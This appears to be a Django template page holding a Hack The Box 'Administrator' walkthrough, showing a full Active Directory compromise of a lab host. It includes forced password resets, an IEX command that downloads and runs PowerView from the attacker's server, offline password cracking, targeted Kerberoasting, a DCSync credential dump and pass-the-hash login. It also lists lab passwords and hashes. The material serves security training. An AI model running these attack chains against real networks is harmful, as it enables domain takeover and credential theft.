@@ -1,0 +1,256 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/machines/machines.css' %}">
+</head>
+<body>
+    <h1 class="title">HTB administrator</h1>
+    <p class="text">Difficulty : Medium | UserDifficulty : 3.8</p>
+    <p class="text">Username : Olivia <br>
+password : ichliebedich</p>
+
+    <h2 class="subtitle">Enumeration</h2>
+    <p class="text">Though we have credential to login, we need to scan open porst.</p>
+    <div class="code-box"><pre><code>└─$ <u>sudo nmap -p- -sCV $IP --min-rate=10000</u>
+PORT      STATE SERVICE       VERSION
+21/tcp    open  ftp           Microsoft ftpd
+| ftp-syst: 
+|_  SYST: Windows_NT
+53/tcp    open  domain        Simple DNS Plus
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-11-10 14:19:08Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf        .NET Message Framing
+49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+49666/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49668/tcp open  msrpc         Microsoft Windows RPC
+56909/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+56911/tcp open  msrpc         Microsoft Windows RPC
+56925/tcp open  msrpc         Microsoft Windows RPC
+56939/tcp open  msrpc         Microsoft Windows RPC</code></pre></div>
+<p class="text">FTP and SMB are open. Let's enumerate them to check if there are interesting information.</p>
+
+<div class="code-box"><pre><code>└─$ ftp 10.129.27.133         
+Connected to 10.129.27.133.
+220 Microsoft FTP Service
+Name (10.129.27.133:kali): 
+331 Password required
+Password: 
+530 User cannot log in.
+ftp: Login failed
+ftp></code></pre></div>
+<p class="text">We cannot login as anonymous user.</p>
+<div class="code-box"><pre><code>└─$ crackmapexec smb 10.129.27.133 -u olivia -p 'ichliebedich' --shares
+SMB         10.129.27.133   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
+SMB         10.129.27.133   445    DC               [+] administrator.htb\olivia:ichliebedich 
+SMB         10.129.27.133   445    DC               [+] Enumerated shares
+SMB         10.129.27.133   445    DC               Share           Permissions     Remark
+SMB         10.129.27.133   445    DC               -----           -----------     ------
+SMB         10.129.27.133   445    DC               ADMIN$                          Remote Admin
+SMB         10.129.27.133   445    DC               C$                              Default share
+SMB         10.129.27.133   445    DC               IPC$            READ            Remote IPC
+SMB         10.129.27.133   445    DC               NETLOGON        READ            Logon server share 
+SMB         10.129.27.133   445    DC               SYSVOL          READ            Logon server share</code></pre></div>
+
+<p class="text">We have several shares to read, but there was no juicy information. Let's move to evil-winrm and collect information.</p>
+
+<div class="code-box"><pre><code>└─$ evil-winrm -i 10.129.27.133 -u Olivia -p 'ichliebedich'                                       
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\olivia\Documents> </code></pre></div>
+
+<p class="text">Then, to grasp the target's AD struture, we can use bloodhound. </p>
+<div class="code-box"><pre><code>*Evil-WinRM* PS C:\Users\olivia\Documents> upload ../bloodhound/SharpHound.exe
+
+
+*Evil-WinRM* PS C:\Users\olivia\Documents> .\SharpHound.exe
+2025-11-10T08:13:03.5443696-08:00|INFORMATION|This version of SharpHound is compatible with the 5.0.0 Release of BloodHound
+2025-11-10T08:13:03.7162293-08:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote, CertServices, LdapServices, WebClientService, SmbInfo
+2025-11-10T08:13:03.7631010-08:00|INFORMATION|Initializing SharpHound at 8:13 AM on 11/10/2025
+...
+*Evil-WinRM* PS C:\Users\olivia\Documents> dir
+
+
+    Directory: C:\Users\olivia\Documents
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----        11/10/2025   8:13 AM          27628 20251110081306_BloodHound.zip
+-a----        11/10/2025   8:13 AM           1428 NDI3ZmMyMGItNzc4Ny00MzE1LTllNDItYTM4YTEzYjcyZDFj.bin
+-a----        11/10/2025   6:28 AM        1311232 SharpHound.exe</code></pre></div>
+
+<p class="text">We can use generated zip file to analyze the AD.</p>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/administrator/1.png' %}" alt="">
+    <p class="text">Opening outbound Object Control, we have GenericAll privilege against MICHAEL user. Thus, we can change the password of michael without knowing target's password.</p>
+</div>
+<div class="code-box"><pre><code>*Evil-WinRM* PS C:\Users\olivia\Documents> net user michael pwn123! /domain</code></pre></div>
+<p class="text">Then, we can use full privilege of Michael user.</p>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/administrator/8.png' %}" alt="">
+    <p class="text">As the same, Michael user has Outbound Object Control against Benjamin. We can force change passowrd for Benjamin.</p>
+</div>
+
+
+<p class="text">This procedure requires PowerView module. Let's serve it to target machine. </p>
+<div class="code-box"><pre><code>└─$ python3 -m http.server 80
+...
+    
+*Evil-WinRM* PS C:\Users\olivia\Documents> IEX (New-Object Net.WebClient).DownloadString('http://10.10.16.38/PowerView.ps1')
+*Evil-WinRM* PS C:\Users\olivia\Documents> $SecPassword = ConvertTo-SecureString 'pwn123!' -AsPlainText -Force
+*Evil-WinRM* PS C:\Users\olivia\Documents> $Cred = New-Object System.Management.Automation.PSCredential('administrator\michael', $SecPassword)
+*Evil-WinRM* PS C:\Users\olivia\Documents> $UserPassword = ConvertTo-SecureString 'pwn123!' -AsPlainText -Force
+*Evil-WinRM* PS C:\Users\olivia\Documents> Set-DomainUserPassword -Identity benjamin -AccountPassword $UserPassword -Credential $Cred</code></pre></div>
+
+<p class="text">We could changed Benjamin's password. Let's check if it's affected successfully.</p>
+<div class="code-box"><pre><code>└─$ ftp 10.129.27.133
+Connected to 10.129.27.133.
+220 Microsoft FTP Service
+Name (10.129.27.133:kali): benjamin 
+331 Password required
+Password: 
+230 User logged in.
+Remote system type is Windows_NT.
+ftp> dir
+229 Entering Extended Passive Mode (|||64588|)
+125 Data connection already open; Transfer starting.
+10-05-24  08:13AM                  952 <u>Backup.psafe3</u>
+226 Transfer complete.
+ftp> </code></pre></div>
+
+<p class="text">We could enter ftp with the benjamini's password credential. Also there is Password Safe file. </p>
+
+<h1 class="subtitle">Foothold</h1>
+<p class="text">.psafe3 is a securely encrypted database file used by the Password Safe password manager. We can open this file with pwsafe client.</p>
+<div class="code-box"><pre><code>└─$ pwsafe Backup.psafe3 </code></pre></div>
+<div class="img">
+    <img src="{% static 'EthHack/images/administrator/2.png' %}" alt="">
+    <p class="text">However, it requires master password to open this file. <br>Thus, we need to crack the master password for password safe file.</p>
+</div>
+
+<div class="code-box"><pre><code>└─$ hashcat -h | grep -i 'password safe'
+   9000 | Password Safe v2                                           | Password Manager
+   <u>5200</u> | Password Safe v3                                           | Password Manager</code></pre></div>
+
+   <div class="code-box"><pre><code>└─$ hashcat Backup.psafe3 /usr/share/wordlists/rockyou.txt -m 5200
+
+Dictionary cache hit:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344385
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+
+Backup.psafe3:<u>tekieromucho</u>  </code></pre></div>
+
+<p class="text">We got master password for safe password.</p>
+<div class="img">
+    <img src="{% static 'EthHack/images/administrator/3.png' %}" alt="">
+    <p class="text">We can get 3 passwrods for 3 ppl with right click. <br><br>Emily : <u>UXLCI5iETUsIBoFVTj8yQFKoHjXmb</u> <br><br>alexander : <u>UrkIbagoxMyUGw0aPlj9B0AXSea4Sw</u> <br><br>emma : <u>WwANQWnmJnGV07WQN8bMS7FMAbjNur</u></p>
+</div>
+
+<p class="text">Then, back to the BloodHound...</p>
+<div class="img">
+    <img src="{% static 'EthHack/images/administrator/4.png' %}" alt="">
+    <img src="{% static 'EthHack/images/administrator/5.png' %}" alt="">
+</div>
+
+<p class="text">The both Emma and Alexander don't have useful privilege and Outbound Object Control.</p>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/administrator/6.png' %}" alt="">
+    <p class="text">However, Emily has Outbound Object Control against ETHAN. </p>
+</div>
+<div class="img">
+    <img src="{% static 'EthHack/images/administrator/7.png' %}" alt="">
+    <p class="text">Additionally, ETHAN user has DCsync privilege against local machine. It does mean we can get all users' passwords with Ethan's credential.</p>
+</div>
+
+<p class="text">In this scenario, we can perform Targeted Kerberoasting. For that purpose, there is great tool : targetedKerberoast.py</p>
+<div class="code-box"><pre><code>└─$ git clone https://github.com/ShutdownRepo/targetedKerberoast.git
+└─$ cd targetedKerberoast</code></pre></div>
+
+<p class="text">However, when we run the code like below, we face error <u>Clock skew too great</u>.</p>
+<p class="text">└─$ python3 targetedKerberoast.py --dc-ip 10.129.27.133 -d administrator.htb -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
+[*] Starting kerberoast attacks
+[*] Fetching usernames from Active Directory with LDAP
+[!] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)</p>
+
+<p class="text">This means the time settings between us and the target machine is too far. <u>Since Kerberos is very time sensitive you should configure your client machines to use one of your domain controllers as an NTP server</u>.</p>
+
+<p class="text">To use the same time with the target, we use 2 tools.</p>
+<div class="code-box"><pre><code>└─$ sudo ntpdate administrator.htb
+[sudo] password for kali: 
+<u>2025-11-10 11:46:30</u>.004298 (-0500) +25202.185662 +/- 0.043783 administrator.htb 10.129.27.133 s1 no-leap
+CLOCK: time stepped by 25202.185662</code></pre></div>
+<p class="text">This returned the time 2025-11-10 11:46:30, but my VM is pointing 4:47. We need to use 2025-11-10 11:46:30 for requesting.</p>
+<p class="text">For that purpose, we can use a tool <u>faketime</u>.</p>
+<div class="code-box"><pre><code>└─$ faketime '2025-11-10 11:46:30' python3 targetedKerberoast.py --dc-ip 10.129.27.133 -d administrator.htb -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
+└─$ faketime '2025-11-10 11:46:30' python3 targetedKerberoast.py --dc-ip 10.129.27.133 -d administrator.htb -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
+[*] Starting kerberoast attacks
+[*] Fetching usernames from Active Directory with LDAP
+[+] Printing hash for (ethan)
+$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$90e2882a88111d29e05adde619d20521$cf4d46116f8fd020d266e95c9e11d35dd5fb06aef33ac92b26b9fc48e915747eacf186bc13d9030445e08efaaef54f67d7f2fac8f1c64114837e4dd1747e8a19133ec066e2a2200c207325eb08f7d8645824549aef178aaf2a589ad68b78e42be825fb593eef6424c72773e1fcbecba5010299c3c5a5e540d7b1529dbf49a0fcfa447e618bbe4255b53ac987edad8f343a1bf699a02464050438ebedcfbd3cf02f88b0d9907431a66eaebeecef2aa71346efa227dc9a5e2ee7abab73d4b30a3cd3f82fdfea475bd8c788467544a7a49b43fdd2c5a53995459d01b879fff7ecd7d8bf8015816365300e96bc802f15a8a30a3e9706f51dbec4314092abe09b8f1e7da56ed66093c6ee10af4d4d29c9a2f136fefc4d92ca0ea85813a757ea4bf13d08f814eb843c31f967adfd682f6403f801f3732edcfcfbf015ce723e3c067d14d6fa2c3c5ac4fd118c5f92ce5d96e6d9530b96133bda2100b22e436304118819d340d2365284bcd1a662af9d5d2158fee241e0d22d2b1307caaf69e962e3316facd6815b668cf4ae7aa344faef3680da906ff839b8ff50f5eab2bfc31a0b6baf11248d93ac4102dceabfc4aa741c5283fc2e923dc668f0db56b77b996eac93c97ef2222c5117c769a18a0e196ce1a99c56b839fea0b067cab3c4a5ad427d1e8bb6a5a0476738f72d3a5df91969475d8b29525bce6d4def279f5163a371261ddaaf11caf537cde843e7f22fc44600229e16ac433a14cba1e46880b9368562b9e575cc0c397780be5a895e2d66fa478ca7c7db5ca9f50e8ada21135ee73aa773ce4e10bef4d798ca3f3d64b31d8160cd9a1f2c962c6c3cdcb4b56fbefe5b39075f3d22a6681cb8fbdb45b35e6abaa1dc6d42d815011d3bba4ef524d4abd36d572a0df2e32e54530406da5f804eb5920b2e22fe0358998a891e2da7d97853c8e878c69151ca953362eabcc58bbb0d74181dd7eed6d0b7278c1be73af52d4c9ba0476cbe4d596458a8157016f6a20ee8a324b197d81993329d77cf78148a2a7663727657cecef6a2bbc3219602edb4372796877c40dce23cc3d21c82c1b5d516ad24057d19056659fdd0883e6625161771c3b64f266d0f471fe7cdbac07e089a677c99274b06800242deda0d5c80568e7b2f115958387be119dd1aa7ae7f56451c9e900bdea16444dbe2db98bae84475c4d6b4ee09a456f2e447c851d4073df62a28da0e1d0a0e6b7e0acbe1f08dbc3b954b7782639fda42f3dd346430d14df7ec60dbb62cb84ae0f2b7e921af56e4213e2292abf6c3a244ce025007280f6f750547d2a7637aa17fcbecda713d6f1936ef195611b0dee955602d8b4d80765b10caf7fdf4a7c5f9554113c16704236e699da681dc65bba11d3026a636241c58738fb0f9b87ac27798d99cf88c4832b336ced8d9e7b799704a7ee8da2f805ea13b89ed2a583d2933cf58326d3ab758788ad04e5937300c1a06c5550e94a64f4fc1e95f98ac48ea953a5fd2d9955f13c3ebfe4faa47242b63c03eb55150bef3020d98</code></pre></div>
+
+<p class="text">We got ETHAN's password hash via targetedKerberoasting.</p>
+<p class="text">Let's crack this hash.</p>
+
+<div class="code-box"><pre><code>└─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt         
+...
+    <u>limpbizkit</u></code></pre></div>
+    <p class="text">Then, Ethan has no privilege for PsRemote Privilege. Therefore, we need to send DCsync request from our local machine.</p>
+
+    <div class="code-box"><pre><code>└─$ impacket-secretsdump -just-dc-user administrator administrator.htb/ethan:"limpbizkit"@10.129.27.133
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:<u>3dc553ce4b9fd20bd016e098d2d2fd2e</u>:::
+[*] Kerberos keys grabbed
+Administrator:aes256-cts-hmac-sha1-96:9d453509ca9b7bec02ea8c2161d2d340fd94bf30cc7e52cb94853a04e9e69664
+Administrator:aes128-cts-hmac-sha1-96:08b0633a8dd5f1d6cbea29014caea5a2
+Administrator:des-cbc-md5:403286f7cdf18385
+[*] Cleaning up...</code></pre></div>
+<p class="text">Perfect! We can get admin powershell with PTH authentication.</p>
+
+<div class="code-box"><pre><code>└─$ evil-winrm -i 10.129.27.133 -u administrator -H 3dc553ce4b9fd20bd016e098d2d2fd2e
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
+administrator\administrator</code></pre></div>
+
+
+
+
+</body>
+</html>
